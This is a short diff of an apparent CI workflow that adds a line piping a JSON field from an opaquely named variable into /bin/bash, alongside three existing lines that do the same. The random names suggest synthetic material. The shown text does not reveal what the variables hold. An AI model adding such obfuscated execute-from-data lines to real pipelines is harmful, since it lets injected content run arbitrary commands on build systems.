@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$okl0967" | jq -r .d2 | /bin/bash
           printf '%s' "$niu68" | jq -r .byncj8262 | /bin/bash
           echo $i7 | jq -r .pksp81 | /bin/bash
+          printf '%s' "$m95" | jq -r .cqen3 | /bin/bash
 
       - name: Save results
         if: always()
